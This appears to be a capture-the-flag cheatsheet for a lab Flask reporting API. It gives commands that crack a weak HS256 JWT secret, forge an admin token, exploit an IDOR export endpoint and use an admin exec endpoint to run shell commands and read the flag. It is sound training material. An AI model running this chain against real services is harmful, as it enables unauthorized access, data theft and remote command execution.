# Cheatsheet — The Reporting API

## Targets

- **api01** — flask reporting api on :80

## Useful commands

```bash
curl -s http://<ip>/ | jq                              # endpoint map
curl -s -X POST http://<ip>/api/login \
  -H 'content-type: application/json' \
  -d '{"username":"guest","password":"guest123"}' | jq -r .token

# inspect + crack
jwt_tool <token>
jwt_tool <token> -C -d <wordlist>                      # crack HS256
hashcat -m 16500 -a 0 <token> <wordlist>

# forge admin + hit the chain
jwt_tool <token> -I -pc admin -pv true -S hs256 -k <secret>
curl -s http://<ip>/api/users/1/export -H "Authorization: Bearer $T" | jq
curl -s http://<ip>/api/admin/report -H "Authorization: Bearer $T" | jq
curl -s 'http://<ip>/api/admin/exec?cmd=cat+/flag.txt' -H "Authorization: Bearer $T" | jq -r .stdout
```

## Concepts

- HS256 = symmetric — whoever knows the secret mints anything
- IDOR: authorization checked on the *session*, not the *object*
- Chained trust failures compound: weak secret → forged claim → root exec
